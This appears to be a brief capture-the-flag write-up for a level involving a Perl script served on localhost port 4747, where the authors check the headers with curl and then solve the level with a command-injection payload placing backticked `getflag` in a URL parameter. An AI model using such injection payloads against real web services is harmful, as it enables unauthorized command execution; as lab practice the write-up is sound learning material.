# We found in home: level.pl
# We checked the header:
curl -I "localhost:4747"

# We Cat'ed the perl file and we noticed that there is a possibility to inject the param
curl 'localhost:4747?x=`getflag`'

# We got the flag TADAAAAA